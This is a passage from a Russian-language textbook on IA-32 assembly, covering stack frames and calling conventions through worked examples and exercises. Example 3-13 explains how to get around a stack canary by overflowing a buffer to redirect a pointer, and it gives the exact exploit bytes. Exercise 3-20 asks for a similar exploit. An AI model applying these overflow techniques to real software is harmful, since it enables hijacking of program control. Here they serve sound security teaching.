   void f(void) {
      int x;
      scanf("%d", &x);
      printf("%d @ %p\n", x, &x);
   }



Считать, что при вызове функции f стек уже выровнен на границе в 16 байтов.
Пользоваться функциями из учебной библиотеки ввода/вывода запрещено.




                                                                                   45
                                       Решение

     Основная сложность данной задачи заключается в правильном распределении па-
     мяти во фрейме функции f. Это необходимо для того, чтоб можно было корректно
     вызвать библиотечные функции scanf и printf (их использование обусловлено
     ограничением, заданном в условии). Фрейм функции f должен содержать автома-
     тическую локальную переменную x (4 байта), сохраненное значение регистра EBP (4
     байта), фактические аргументы вызываемых функций, а также адрес возврата (4
     байта). Помимо того, значение &x используется в Си-функции дважды, вычислим и
     разместим его в регистре EBX (значение должно «пережить» вызов scanf), а для со-
     хранения прежнего значения регистра выделим еще 4 байта.

     Пространство аргументов будет совместно использоваться функциями scanf и
     printf. При вызове первой потребуется два двойных слова: адрес форматной стро-
     ки и адрес переменной, в которой будет размещено введенное число. Для вызова
     printf потребуется три двойных слова: адрес форматной строки, значение х и ад-
     рес, по которому эта переменная размещена. Таким образом, под пространство
     аргументов потребуется 12 байтов.

     Суммарный объем размещенных во фрейме данных составит 28 байтов, что не
     кратно 16. Необходимо дополнительно выделить 4 байта для выравнивания, тогда
     суммарный объем фрейма достигнет 32 байтов, что уже кратно 16. Компилятор
     GCC традиционно размещает выравнивающие байты непосредственно выше про-
     странства аргументов. Границы блоков памяти, выровненных по 16 байтов, показа-
     ны жирной чертой.




46
  extern scanf, printf

  section .rodata
     .LC0 db "%d", 0        ; Форматная строка для scanf
     .LC1 db `%d @ %p\n`, 0 ; Форматная строка для printf

  section .text
  f:
     push    ebp
     mov     ebp, esp
     push    ebx
     sub     esp, 20
     lea     ebx, [ebp-8]
     mov     dword [esp+4], ebx
     mov     dword [esp], .LC0
     call    scanf
     mov     dword [esp+8], ebx
     mov     eax, dword [ebp-8]
     mov     dword [esp+4], eax
     mov     dword [esp], .LC1
     call    printf
     mov     ebx, dword [ebp-4]
     leave
     ret


Пример 3-11 Дамп файла
Реализуйте на языке ассемблера функцию hdump, которая печатает на стандартный
вывод содержимое файла fname в шестнадцатеричном виде. Печатать следует по
одному байту, разделяя их пробелами, не более 16 байтов в одной строке.

  void hdump(const char * fname);



Считать, что при вызове функции hdump стек уже выровнен на границе в 16 байтов.
Пользоваться функциями из учебной библиотеки ввода/вывода запрещено.

                                    Решение

В функции hdump будут вызываться fopen, getc, printf, fclose. Необходимо объявить
эти функции как внешние для данного модуля. Для работы потребуются три пере-
менные: описатель открытого файла, значение текущего байта, номер текущей по-
зиции в строке. Значение байта будет передаваться из getc в printf, сохранение во
фрейме не требуется. В свою очередь описатель и номер позиции необходимо со-
хранять между вызовами функций, для этих переменных будут выделены регистры
ebx и edi соответственно.




                                                                             47
       extern fopen
       extern fclose
       extern getc
       extern printf

       section .rodata
          LC0 db "rb", 0      ; параметр fopen – открыть двоичный файл на чтение
          LC1 db "%02x ", 0   ; параметр printf для печати считанного байта
          LC2 db `\n`, 0      ; параметр printf для перевода строки



     Для работы библиотечных функций потребуются три строки, которые заданы в
     секции .rodata.

     В функции hdump присутствуют типовые пролог и эпилог. По смещениям EBP-4 и EBP-
     8 сохраняются регистры EBX и EDI соответственно.




48
  hdump:
     push ebp                 ; Пролог
     mov ebp, esp
     sub esp, 24
     mov dword [ebp-4], ebx
     mov dword [ebp-8], edi

     mov eax, dword [ebp+8]   ; Открываем файл fname на чтение
     mov dword [esp], eax
     mov dword [esp+4], LC0
     call fopen
     cmp eax, 0               ; В случае неудачи – сразу выходим
     je   .end
     mov ebx, eax             ; Сохраняем описатель файла в ebx

     mov   edi, 0             ; Обнуляем номер позиции на строке

   .loop:
     mov dword [esp], ebx     ; Считываем один байт
     call getc
     cmp eax, -1              ; -1 – признак конца файла
     je   .le

     inc edi                  ; Увеличиваем счетчик позиции на строке
     mov dword [esp], LC1     ; Печатаем байт. Обязательно выводим два символа
     mov dword [esp+4], eax
     call printf

     and edi, 0xf             ; Если достигли 16 позиции – сбрасываем счетчик
     jnz .currLine            ; в ноль и печатаем функцией printf перевод
     mov dword [esp], LC2     ; строки
     call printf
   .currLine:
     jmp .loop                ; Переходим на считывание очередного байта
    .le:

     test edi, edi            ; Если номер позиции не ноль – надо перевести
     jz   .nl                 ; не до конца оконченную строку
     mov dword [esp], LC2
     call printf
   .nl:

     mov dword [esp], ebx     ; Не забываем закрыть файл
     call fclose

   .end:
     mov edi, dword [ebp-8]
     mov ebx, dword [ebp-4]
     leave
     ret



Устройство фрейма функции
Фрейм содержит как пользовательские, так и служебные данные. Помимо автома-
тических локальных переменных в нем сохраняются регистры и размещен адрес
возврата, переход по которому происходит при завершении функции. Язык Си не
предусматривает контроля границ памяти, выделенной переменным. Ошибки в


                                                                                 49
     индексации массивов и адресной арифметике могут привести не только к порче
     других переменных пользователя, но и, что гораздо хуже, к порче служебных дан-
     ных. При определенных условиях ошибка работы с памятью становится уязвимо-
     стью: специально подобранные входные данные (их принято называть эксплой-
     том) вызывают срабатывание ошибки в таком виде, что поведение программы
     принципиально меняется. Например, до того, как программа аварийно завершит-
     ся, происходит целенаправленная порча определенных данных или отправка дан-
     ных на вывод. Наихудшая ситуация – когда программа в результате срабатывания
     уязвимости начинает выполнять заданный извне код.

     Задачей разработчика является не только обеспечение высокой производительно-
     сти программы, но и ее безопасность – минимальное число ошибок. В тех случаях,
     когда происходит порча данных в памяти предпочтительно аварийно завершать
     выполнение как только всплывает факт срабатывания ошибки. Определенную по-
     мощь разработчику оказывает современный компилятор, встраивающий в про-
     грамму проверки в наиболее опасных с точки зрения безопасности местах.

     Пример 3-12 Карта фрейма
     Для данной Си-функции компилятор построил следующий ассемблерный код.

       #include <stdio.h>

       int f(int i) {
          int array[4];
          scanf("%x", (unsigned*)&array[i]);
          return array[i];
       }                                 section .rodata
                                            LC0 db "%x", 0

                                        section .text
                                        f:
                                           push ebp                      ; (1)
                                           mov ebp, esp                  ; (2)
                                           push ebx                      ; (3)
                                           sub esp, 36                   ; (4)
                                           mov ebx, dword [ebp+8]        ; (5)
                                           mov dword [esp], LC0          ; (6)
                                           lea eax, [ebp-24+ebx*4]       ; (7)
                                           mov dword [esp+4], eax        ; (8)
                                           call scanf                    ; (9)
                                           mov eax, dword [ebp-24+ebx*4] ; (10)
                                           add esp, 36                   ; (11)
                                           pop ebx                       ; (12)
                                           pop ebp                       ; (13)
                                           ret                           ; (14)



     В момент вызова функции (перед выполнением ассемблерной инструкции №1) ре-
     гистры имели следующие значения: ESP = 0xbfffff1c, EBP = 0xbfffff50.


50
При вызове функции scanf co стандартного потока ввода было считано число 0x23.

Строка LC0 размещена в памяти по адресу 0x25207825.

1.   Какое значение регистр EBP получит после выполнения инструкции №2?

2.   Какое значение регистр ESP получит после выполнения инструкции №4?

3.   По какому адресу размещена переменная array?

4.   Нарисуйте карту фрейма, указав на рисунке: границы фрейма, аргументы вы-
     зова, сохраненные регистры, автоматические локальные переменные, про-
     странство аргументов, неиспользуемую память. Укажите содержимое ячеек
     памяти, когда их значение гарантированно известно.

                                  Решение

Начнем решение с того, что определим, как происходило распределение памяти
во фрейме функции.




Границы выровненных блоков показаны на рисунке жирными линиями. Команда-
ми PUSH были сохранены регистры EBP и EBX, после чего на стеке было выделено 9
двойных слов. Общий размер фрейма – 48 байтов, два нижних двойных слова –
пространство аргументов для вызова функции scanf. Как видно по командам №7 и
№10, массив array размещен во фрейме по адресу EBP-24 и занимает целиком вы-
ровненный блок из 16 байтов.



                                                                            51
     Однозначно можно утверждать, что сохраненный EBP и первый аргумент вызова
     scanf (адрес форматной строки) будут иметь значения 0xbfffff50 и 0x25207825 соот-
     ветственно. Куда именно будет помещено введенное число, и, какое значение у
     второго аргумента scanf, зависит от параметра i и не может быть определено толь-
     ко по заданному фрагменту кода.

     Значения регистров в указанные в условиях моменты времени приведены в табли-
     це. После выполнения второй команды EBP будет указывать на место, где сохране-
     но его прежнее значение. После вычитания ESP переместится на нижнее двойное
     слово занятое фреймом функции (верхушка стека).

     Таблица 3. Значения регистров и адрес размещения переменной.

                                                                  Значение

     Регистр EBP после команды №2                                0xbfffff18

     Регистр ESP после команды №4                                0xbffffef0

     Адрес размещения array                                      0xbfffff00



     Пример 3-13 Эксплойт
     Приведенная функция f и ее ассемблерная реализация содержат ошибки, которые
     порождают эксплуатируемую уязвимость.

     Пусть в момент вызова функции f адрес возврата был размещен в стеке по адресу
     0xbffdb3cc. Постройте такой эксплойт, чтобы в результате его обработки функция f
     возвращала управление на адрес 0xdeadbeef.




52
  #include <string.h>                 f:
                                         push   ebp                 ; (1)
  void f(char *in1, char *in2) {         mov    ebp, esp            ; (2)
     char *ptr;                          push   ebx                 ; (3)
     char buf[16];                       sub    esp, 36             ; (4)
     strcpy(buf, in1);                   mov    ebx, dword [ebp+12] ; (5)
     strcpy(ptr, in2);                   mov    eax, dword [gs:20] ; (6)
  }                                      mov    dword [ebp-8], eax ; (7)
                                         xor    eax, eax            ; (8)
                                         mov    eax, dword [ebp+8] ; (9)
                                         mov    dword [esp+4], eax ; (10)
                                         lea    eax, [ebp-28]       ; (11)
                                         mov    dword [esp], eax    ; (12)
                                         call   strcpy              ; (13)
                                         mov    dword [esp+4], ebx ; (14)
                                         lea    eax, [ebp-12]       ; (15)
                                         mov    dword [esp], eax    ; (16)
                                         call   strcpy              ; (17)
                                         mov    eax, dword [ebp-8] ; (18)
                                         xor    eax, dword [gs:20] ; (19)
                                         jne    .L5                 ; (20)
                                         add    esp, 36             ; (21)
                                         pop    ebx                 ; (22)
                                         pop    ebp                 ; (23)
                                         ret                        ; (24)
                                      .L5:
                                         call   __stack_chk_fail    ; (25)



                                   Решение

Как и в предыдущей задаче, определим, как происходило распределение памяти
во фрейме функции. Помимо всего, компилятор поместил во фрейм функции «ка-
нарейку» – контрольное значение, которое будет затираться при переполнении
массива buf (Команды №6-8). Значение «канарейки» проверяется перед выходом
из функции (Команды №18-20). Если «канарейка» изменилась – управление пере-
дается на функцию, выполняющую аварийное завершение работы программы.

«Канарейка» защищает от изменения адрес возврата, поскольку массив buf распо-
ложен ниже (ebp-28). Но указатель ptr расположен также ниже «канарейки» и его
значение может быть изменено в результате переполнения. Для этого необходимо
задать первый параметр в виде строки из 16 произвольных ненулевых байтов (в
приведенном решении они выделены курсивом), а затем – адрес 0xbffdb3cc, по ко-
торому размещен адрес возврата. Байты адреса, как и любые другие целые числа,
следует развернуть в обратном порядке (начиная с младших). Важно, чтобы сразу
после адреса строка заканчивалась, т. к. в противном случае будет изменено зна-
чение «канарейки».




                                                                             53
     Второй вызов функции strcpy перепишет адрес возврата; в параметре in2 должен
     быть задан адрес 0xdeadbeef, на который требуется передать управление. Посколь-
     ку других действий предпринимать не требуется, параметр in2 можно этим огра-
     ничить.


     in1     ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   ff   cc   b3   fd   bf   00

     in2     ef   be   ad   de   00



     Задачи

     Задача 3-1
     В стеке записаны 20 указателей типа char* (последний из указателей находится на
     вершине стека). Не меняя состояние стека, обнулить значения по данным указате-
     лям.

     Задача 3-2
     В стеке записано 50 чисел типа int (последнее число находится на вершине стека).

           а) Среди этих чисел подсчитать количество чисел, имеющих равных «соседей»
              (предыдущее и последующее числа), и записать ответ в регистр EAX.
           б) Считая, что числа заносились в стек в порядке x1, x2, …, x50, записать в ре-
              гистр EAX число 1, если последовательность x1, x2, …, x50 является возрастаю-
              щей, или 0 в противном случае.


54
Состояние стека менять не разрешается.

Задача 3-3 Максимум двух чисел
Требуется реализовать функцию max, соответствующую прототипу int max(int a,
int b), которая возвращает максимальное значение своих параметров.

Задача 3-4 Поменять местами
Требуется оформить функцию swap, соответствующую прототипу void swap(int *a,
int *b), которая меняет значения своих аргументов.

Задача 3-5 Восстановить объявление функции
Тело Си-функции f имеет следующий вид:

  *p = d;
  return x-a;



Этому телу соответствует следующий ассемблерный код.

  movsx edx, byte [ebp + 12]
  mov   eax, dword [ebp + 16]
  mov   dword [eax], edx
  movsx eax, byte [ebp + 8]
  mov   edx, dword [ebp + 20]
  sub   edx, eax
  mov   eax, edx



Требуется восстановить прототип функции f.

Задача 3-6
Реализовать функцию с прототипом int f(unsigned n) для решения следующей за-
дачи:

   а) функция возвращает значение 1, если количество единиц в двоичном пред-
      ставлении числа n превышает количество нулей;
   б) функция возвращает значение 1, если в двоичном представлении числа n
      имеется 5 стоящих подряд единиц.

Реализация должна удовлетворять соглашению cdecl.

Задача 3-7
Описать функцию int max(short *a, unsigned n), которая возвращает в качестве ре-
зультата значение максимального элемента массива a из n элементов. Функция
должна удовлетворять соглашению cdecl.




                                                                            55
     Задача 3-8 Факториал
     Реализовать в виде функции вычисление факториала.

     Задача 3-9 Только рекурсия
     Описать рекурсивную функцию для решения следующих задач. Функция должна
     удовлетворять соглашению cdecl:

        1. На входном потоке задан текст в виде последовательности символов, закан-
           чивающейся точкой.
           а) Вывести символы текста в обратном порядке.
           б) Подсчитать количество вхождений цифр в указанный текст.
        2. На входном потоке задана последовательность ненулевых чисел типа int
           (признаком окончания последовательности является число 0). Вывести сна-
           чала все отрицательные числа этой последовательности, а затем все осталь-
           ные (в любом порядке).
        3. Для числа unsigned n найти:
           а) Сумму цифр в его десятичной записи.
           б) Максимальное значение цифры в его десятичной записи.

     Задача 3-10 Выравнивание стека
     Требуется должным образом оформить функцию main для последующего вызова
     функций стандартной библиотеки. Необходимо выровнять стек по границе 16 бай-
     тов.

     Задача 3-11 «Сколько время»
     Требуется напечатать на стандартный вывод текущее время. Пример вывода:

     Tue Mar 29 23:00:33 2011

     Указание: воспользуйтесь функциями стандартной библиотеки языка Си:

       #include <time.h>
       time_t time(time_t *timer);
       char *ctime(const time_t *timer);


     Задача 3-12
     Реализовать функцию стандартной библиотеки языка Си memcpy в соответствии с со-
     глашением cdecl.

       void *memcpy(void *destination, const void *source, size_t num);




56
Функция memcpy не допускает пересечение между областями памяти, указываемы-
ми в source и dest. Примечание: Тип size_t — 32-битное беззнаковое целое.

Задача 3-13
Реализовать функцию стандартной библиотеки языка Си memmove в соответствии с
соглашением cdecl.

  void *memmove(void *destination, const void *source, size_t num);



Функция memmove допускает пересечение между областями памяти, указываемыми
в source и dest.

Задача 3-14
Написать полную программу на языке ассемблера, которая вводит с клавиатуры
два целых числа (int) и выводит:

  а) максимальное из этих чисел;
  б) среднее арифметическое этих чисел.

Для ввода/вывода использовать функции стандартной библиотеки языка Си: scanf
и printf. Для расположения вводимых чисел использовать стек. Обеспечить вырав-
нивание стека в функции main.

Задача 3-15
Написать полную программу на языке ассемблера, которая вводит с клавиатуры
целое число (int), вычисляет его абсолютное значение и выводит его. Программа
должна использовать функции стандартной библиотеки языка Си: scanf, abs и
printf. Вводимое число расположить в стеке. Обеспечить выравнивание стека в
функции main. Прототип функции abs имеет вид int abs(int n);

Задача 3-16
Реализовать функцию strpfx, которая возвращает длину наибольшего общего пре-
фикса строк s1 и s2, в соответствии с соглашением cdecl. Строки:

  а) не могут полностью совпадать;
  б) могут полностью совпадать.

  size_t strpfx(const char *s1, const char *s2);



Примечание: данная функция не входит в стандартную библиотеку языка Си.




                                                                          57
     Задача 3-17
     При компьютерной обработке звука используется дискретное представление зву-
     кового сигнала: звук рассматривается как массив дискретных сэмплов (моменталь-
     ных значений амплитуды), снятых с источника с определенной частотой (частота
     дискретизации). Эти значения могут храниться, например, в виде знаковых 8-
     разрядных целых чисел.

     Таким образом, монофонический звук может быть представлен массивом signed
     char *M, где M[i] — значение амплитуды в момент времени i*T, где T — период
     дискретизации.

     Стереофонический звук, как правило, представляется в «переплетенном» (inter-
     leaved) формате: в массиве signed char *S четные элементы соответствуют ампли-
     туде в левом канале, а нечетные — в правом. Иными словами, для одного и того
     же стереофонического звука, представленного в таком формате и в виде двух мо-
     нофонических массивов L и R верны соотношения:

       S[0] == L[0];
       S[1] == R[0];
       S[2] == L[1];
       S[3] == R[1];
       ...
       S[i] == (i % 2 ? R : L)[i / 2];



     Требуется реализовать функции преобразования:

        а) двух монофонических сигналов для левого и правого уха L и R в interleaved
           stereo S;
        б) interleaved stereo сигнала S в два монофонических L и R.

       /* Преобразование из L и R в S. Число сэмплов передается в n. */
       void
       interleave(size_t n, const signed char *L, const signed char *R,
          signed char *S);

       /* Преобразование из S в L и R. Число сэмплов передается в n.   */
       void
       deinterleave(size_t n, const signed char *S, signed char *L,
          signed char *R);



     Задача 3-18
     C использованием функции стандартной библиотеки языка Си qsort реализуйте:

        а) функцию с прототипом void sort1(int *x, int n), сортирующую по неубыва-
           нию массив x, в котором содержатся n целочисленных значений;


58
   б) функцию с прототипом void sort2(unsigned long long *x, int n), сортирую-
      щую по невозрастанию массив x, в котором содержатся n целочисленных
      значений;
   в) функцию с прототипом void sort3(char **x, int n), сортирующую в лексико-
      графическом порядке массив строк x длины n с использованием библиотеч-
      ной функции strcmp.

Задача 3-19
Измените решение Примера 3-9 таким образом, чтобы в теле цикла, выполняюще-
го копирование данных, вместо команды POP использовалась команда PUSH.

Задача 3-20
Функция g и ее ассемблерная реализация содержат ошибки, которые порождают
эксплуатируемую уязвимость.

Пусть в момент вызова функции g адрес возврата был размещен в стеке по адресу
0xbfc1d80c. Постройте такой эксплойт, чтобы в результате его обработки функция g
возвращала управление на адрес 0xdabbad00.

  int g(int i, int val, int dest) {       g:
     int *lp;                                  push    ebp
     int buf[3];                               mov     ebp, esp
                                               sub     esp, 16
      buf[i] = val;                            mov     eax, dword [ebp+8]
      *lp = dest;                              mov     edx, dword [ebp+12]
                                               mov     dword [ebp-12+eax*4], edx
      return *lp + buf[i];                     mov     eax, dword [ebp-16]
  }                                            mov     edx, dword [ebp+16]
                                               mov     dword [eax], edx
                                               mov     eax, dword [ebp-16]
                                               mov     edx, dword [eax]
                                               mov     eax, dword [ebp+8]
                                               mov     eax, dword [ebp-12+eax*4]
                                               lea     eax, [edx+eax]
                                               leave
                                               ret




                                                                                   59
     4.      Различные соглашения вызова функций
     Оптимизация вызова функций
     Деление программы на функции упрощает разработку (и делает в принципе воз-
     можным разрабатывать большие программы), но вносит накладные расходы на
     организацию вызова функций. Компилятор по возможности оптимизирует эти рас-
     ходы, как с помощью классических оптимизаций кода, так и применением более
     эффективных соглашений вызова.

     После того, как была завершена отладка программы и она собирается с включен-
     ной оптимизацией, появляется возможность отказаться от использования указате-
     ля фрейма (“omit frame pointer”): все обращения к содержимому стека выполняют-
     ся только через регистр ESP, что делает дальнейшую отладку затруднительной. Зато
     с точки зрения эффективности такой подход дает два преимущества: (1) исчезает
     необходимость сохранять и восстанавливать EBP в прологе и эпилоге функции, и (2)
     у компилятора появляется дополнительный регистр для организации вычислений.

     Еще одна возможность улучшить производительность кода появляется в случае,
     когда формальных параметров достаточно мало. Тогда их можно передавать не
     через память (стек), а через сохраняемые в вызывающей функции регистры
     (fastcall). Общего стандарта на такой способ вызова функций нет, но компиляторы
     GCC и Microsoft используют схожие правила.

     Пример 4-1 “Omit frame pointer”
     Реализуйте заданную функцию на языке ассемблера для платформы IA-32/Linux.
     Дополнительные требования: (1) реализация должна использовать рекурсивный
     вызов, (2) код должен отражать особенности компиляции с ключом
     -fomit-frame-pointer.


          typedef struct t_link {
             short payload;
             struct t_link *next;
          } link;

          int f(link* chain) {
             return chain? chain->payload + f(chain->next) : 0;
          }



                                           Решение

     Поскольку необходимо организовывать рекурсивный вызов, придется помещать
     двойное слово на стек. Будем делать это непосредственно перед рекурсивным вы-
     зовом, а сразу после вернем указатель стека на место. Таким образом, при вычис-

60
лении выражений ESP будет указывать на адрес возврата, а формальный параметр
достижим по адресу ESP+4.

  f:
       mov eax, dword [esp+4]
       testeax, eax           ; Проверяем, не 0 ли указатель chain
       jz  .false             ; Если 0 – сразу выходим, eax уже содержит нужное
                              ; число
     push [eax+4]             ; Кладем на стек chain->next
     call f                   ; Рекурсивный вызов
     add   esp, 4             ; Очищаем стек от фактического аргумента
     mov   ecx, dword [esp+4] ; Берем параметр chain
     movsx ecx, word [ecx]    ; Расширяем chain->payload до типа int
     add   eax, ecx           ; Добавляем ecx к тому, что вернул рекурсивный
                              ; вызов
  .false:
     ret


Пример 4-2 Соглашение fastcall
Реализуйте приведенный ниже Си-код. Дополнительные требования: (1) реали-
зация должна использовать рекурсивный вызов, (2) код должен отражать особен-
ности компиляции с ключом -fomit-frame-pointer.

  #include <stdio.h>

  typedef struct t_dlink {
     int          payload;
     struct t_dlink *next;
     struct t_dlink *prev;
  } dlink;

  __attribute__((fastcall)) void f(dlink *p, _Bool direction) {
     if (!p) {
        return;
     }

       if (p->payload) {
          printf("Payload %d @ link %p\n", p->payload, (void*)p);
       } else {
          if (direction) {
             p = p->next;
          } else {
             p = p->prev;
          }
          f(p, direction);
       }
  }



                                     Решение

Соглашение fastcall предполагает передачу первого параметра через регистр ECX,
второго – через EDX (если размера регистров хватает для их размещения). В данном


                                                                                  61
     случае указатель p передается через ECX, а direction – через EDX (более точно – че-
     рез DL). Для вызова printf на стеке потребуется 3 двойных слова. Для рекурсивного
     вызова f на стеке ничего размещать не придется, аргументы должны быть поме-
     щены в ECX и EDX, причем второй регистр обновлять не требуется. В свою очередь
     ECX должен быть перезаписан адресом, считанным из ячейки с адресом либо ECX+4,
     либо ECX+8.

        extern printf

        section .rodata
           .LC0 db `Payload %d @ link %p\n`, 0 ; форматная строка для функции printf

        section .text
        f:
           test    ecx, ecx
           jz      .L6
           mov     eax, dword [ecx]            ; eax : p->payload
           test    eax, eax
           jnz     .L8
           test    dl, dl
           jnz     .L9                         ; Если direction == false
           mov     ecx, dword [ecx+8]          ; ecx : p = p->prev
           jmp     .L5
        .L9:                                  ; Если direction == true
           mov     ecx, dword [ecx+4]         ; ecx : p = p->next
        .L5:
           call    f                          ; Рекурсивный вызов с подготовленными
           ret                                ; ecx и edx
        .L8:                                  ; Сюда попадаем, когда p->payload != 0
           sub     esp, 12                    ; Выделяем место под три аргумента:
           mov     dword [esp+8], ecx         ; Третий аргумент ecx : p
           mov     dword [esp+4], eax         ; Второй аргумент eax : p->payload
           mov     dword [esp], .LC0          ; Первый аргумент – форматная строка
           call    printf
           add     esp, 12                     ; Освобождаем место аргументов
         .L6:
           ret


     Очистка стека от аргументов вызова
     Соглашение cdecl предполагает, что вызывающая функция размещает фактические
     аргументы на стеке, а потом освобождает стек. Другое соглашение вызова – stdcall
     предписывает вызванной функции самой освободить место на стеке, занятое ее
     параметрами. Это соглашение используется при вызове функций Win32 API ОС
     Windows. Возврат из функции делается командой RET N, где N – число освобождае-
     мых байтов на стеке, помимо адреса возврата. В качестве N используют суммарный
     размер памяти на стеке, занятой аргументами вызова. Как следствие, это соглаше-
     ние не позволяет реализовывать функции с переменным числом параметров, пе-
     редаваемых по значению через стек.




62
Еще одной ситуацией, когда вызванная функция очищает стек от параметров, яв-
ляется возврат из функции структуры в компиляторе GCC. В такой ситуации задей-
ствуются правила, из-за которых реализацию cdecl в GCC называют гибридной. По-
скольку значение структуры имеет произвольный размер, для его возврата в об-
щем случае регистра EAX не хватает. Компилятор при вызове такой функции поме-
щает первым на стек служебный параметр – адрес памяти, в которой должно быть
размещено содержимое структуры. При выходе из функции этот служебный пара-
метр освобождается командой RET 4. Если вызывающая функция изначально раз-
метила стек так, что этот служебный параметр находится внутри ее фрейма, то при
необходимости будет добавлен код компенсации, возвращающий ESP на должное
место, нижнюю границу фрейма.

Пример 4-3 Соглашение stdcall
Реализуйте на языке ассемблера заданную функцию.

  unsigned __attribute__((stdcall)) f(unsigned x, unsigned y, int pos) {
     unsigned t = ~(x & y) & (1 << pos);
     return t;
  }



                                    Решение

Единственной особенностью функции будет то, что в момент выхода из нее со сте-
ка будет дополнительно снято 12 байтов – память, занятая фактическими аргумен-
тами вызова.

  f:
       push   ebp                 ; Стандартный пролог
       mov    ebp, esp

       mov    edx, dword [ebp+12]
       and    edx, dword [ebp+8] ;    x & y
       not    edx                 ; ~(x & y)
       mov    eax, 1
       mov    ecx, dword [ebp+16]
       sal    eax, cl             ; 1 << pos
       and    eax, edx            ; ~(x & y) & (1 << pos)

       pop    ebp               ; Восстанавливаем ebp
       ret    12                ; Возвращаемся и очищаем три двойных слова



Пример 4-4 Передача структуры в функцию в качестве параметра
Реализуйте на языке ассемблера заданную функцию.




                                                                             63
       #include <stdlib.h>                link* h(pair data) {
                                             link *p = (link*)malloc(sizeof(link));
       typedef struct t_pair {               p->payload = data;
          int x;                             p->next = (link*)0;
          int y;                             return p;
       } pair;                            }

       typedef struct t_link {
          pair payload;
          struct t_link *next;
       } link;



                                           Решение

     Перед вызовом функции malloc стек должен быть выровнен по 16-байтной грани-
     це: 4 байта заняты адресом возврата, в 4 байтах сохранен EBP, 4 байта пропущены и
     не используются, 4 байта – аргумент функции malloc.




       h:
            push    ebp
            mov     ebp, esp
            sub     esp, 4
            push    12
            call    malloc                ; В eax – адрес выделенной памяти
            mov     ecx, dword [ebp+12]   ; Копируем data по частям, а именно по
            mov     edx, dword [ebp+8]    ; отдельным полям
            mov     dword [eax+4], ecx
            mov     dword [eax], edx
            mov     dword [eax+8], 0      ; Заполняем последнее поле p->next = (link*)0
            leave
            ret



     Структуры передаются в функцию по значению: на стеке будет выделено место
     (кратное 4 байтам), достаточное для того, что бы скопировать в него всю структуру.
     Размер pair – 8 байтов, содержимое параметра data будет располагаться сразу по-
     сле адреса возврата. Поскольку структура состоит всего из двух полей типа int, об-



64
ращения к ним происходят по смещениям EBP+8 и EBP+12, что принципиально неот-
личимо от ситуации, когда в функцию передаются два параметра типа int.

Следует отметить, что если бы размеры полей были по 2 байта (например, тип
short), размещение данных на стеке станет характерным для структуры. При пере-
даче параметров для каждого из них выделятся память кратная 4 байтам. В случае,
когда используются два параметра типа short, для них выделяется по 4 байта
(двойное слово), причем 2 старших байта в каждом двойном слове будут исполь-
зоваться в качестве заполнителя для выравнивания параметров. Для одного пара-
метра – структуры будет выделено 4 байта, которые будут все заполнены содер-
жимым структуры.




Пример 4-5 Возвращаемое значение – структура
Реализуйте на языке ассемблера заданную функцию.

  typedef struct t_pair {       pair f(link* p, int tres) {
     int x;                        while (p) {
     int y;                           int dist = p->payload.x - p->payload.y;
  } pair;                             if (dist < 0) {
                                         dist = -dist;
  typedef struct t_link {             }
     pair payload;                    if (tres < dist) {
     struct t_link *next;               return p->payload;
  } link;                             }
                                      p = p->next;
                                   }
                                   return (pair){0, 0};
                                }



                                                                                65
                                       Решение

     Основным изменением, по сравнению с привычным соглашением cdecl, будет то,
     что на стеке, непосредственно выше адреса возврата появится неявный служебный
     параметр, помещенный туда компилятором. Через этот параметр будет переда-
     ваться адрес для возвращаемого значения, являющегося структурой. Где именно
     будет выделена память под возвращаемое значение – «забота» вызывающей
     функции.




     По завершении работы вызванной функции управление возвращается командой
     RET 4, которая освободит стек от служебного параметра, оставив на нем только те,
     что явно заданы пользователем в объявлении функции.




66
  f:
       push ebp                 ; Стандартный для соглашения cdecl пролог
       mov ebp, esp
       push esi                ; Регистр esi будет использоваться в вычислениях
       mov eax, dword [ebp+8]  ; Неявный служебный параметр – адрес для
                               ; возвращаемого значения
     mov   edx, dword [ebp+12] ; Параметр link* p
     mov   esi, dword [ebp+16] ; Параметр int tres
     jmp   .L2                 ; Сразу переходим на проверку условия while
   .L5:                        ; Начало тела цикла
     mov   ecx, dword [edx]    ; ecx| p->payload.x
     sub   ecx, dword [edx+4] ; ecx| p->payload.x - p->payload.y
     jge   .L4
     neg   ecx                 ; Если число в ecx отрицательное – меняем знак
   .L4:
     cmp esi, ecx               ; Сравниваем tres и модуль разности
     jge .L3
     mov ecx, dword [edx+4]     ; Возвращаем p->payload. Копируем структуру pair
     mov edx, dword [edx]       ; в регистры edx, ecx
     mov dword [eax+4], ecx     ; eax указывает на место размещения возвращаемого
     mov dword [eax], edx       ; значения
     jmp .L1                    ; Переходим на эпилог
   .L3:
     mov edx, dword [edx+8]     ; edx| p = p->next
   .L2:
     test edx, edx              ; Проверка условия цикла while: продолжаем
     jne .L5                    ; итерироваться, пока edx|p не равно нулю
     mov dword [eax], 0         ; Возвращаемое значение – (pair){0, 0}
     mov dword [eax+4], 0
   .L1:                         ; Конец тела функции – эпилог
     pop esi                    ; Восстанавливаем регистр esi и указатель фрейма
     pop ebp
     ret 4                      ; Удаляем со стека служебный параметр



Пример 4-6 Вызов функции с возвращаемой структурой
Реализуйте на языке ассемблера заданную функцию. Вызываемая функция f – ли-
стовая, выравнивать стек для ее вызова не обязательно. Дополнительное ограни-
чение: при реализации тела функции запрещено использовать команды MOV.

  typedef struct t_pair {           pair f(link* p, int tres);
     int x;
     int y;                         void g(link *p) {
  } pair;                              static const int treshold = 9000;
                                       pair v = f(p, treshold);
  typedef struct t_link {              printf("Pair (%d, %d)\n", v.x, v.y);
     pair payload;                  }
     struct t_link *next;
  } link;



                                     Решение

В отсутствии возможности пересылать данные командой MOV, аргументы на стек
будут помещаться естественной в такой ситуации командой PUSH. Размер фрейма

                                                                                    67
     будет меняться в процессе работы функции g. Другой, более важной особенностью
     рассматриваемого далее кода является то, что фактическим первым аргументом
     вызова функции f будет адрес автоматической локальной переменной v (неявный
     аргумент). Для переменной static const int treshold места в памяти не выделяет-
     ся, в выражении непосредственно используется ее значение. Пространство аргу-
     ментов совместно используется при вызове функций printf и f. Поскольку для вы-
     зова f стек не требуется выравнивать, будем класть на стек аргументы сразу после
     выделения 8 байтов памяти для хранения переменной v. Таким образом, фрейм
     функции g имеет следующую структуру.




     После возврата из функции f двойное слово с адресом v будет освобождено. Для
     того, что бы функция printf вызывалась на выровненном стеке, освободим еще
     одно двойное слово, содержащее значение p. В результате фреймом функции g
     будет занято 20 байтов, пять двойных слов: адрес возврата, сохраненный регистр
